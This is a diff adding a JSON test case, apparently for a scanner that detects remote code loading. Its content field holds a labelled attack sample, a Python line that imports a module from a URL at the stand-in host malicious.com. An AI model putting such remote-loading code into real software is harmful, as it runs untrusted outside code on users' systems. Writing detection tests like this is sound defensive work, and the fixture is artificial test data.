@@ -1,0 +1,14 @@
+{
+  "test_case_id": "RL_POS_002",
+  "attack_type": "remote_load",
+  "sample_type": "positive",
+  "content": "# Attack sample: remote_load variant 2\nfrom importlib import import_module\nimport_module('http://malicious.com/module')\n",
+  "content_hash": "3c25fad9eafaa3aa",
+  "expected_result": true,
+  "metadata": {
+    "variant": "base",
+    "difficulty": "easy",
+    "created_at": "2026-03-19T07:37:00.582313",
+    "generator_version": "1.0.0"
+  }
+}
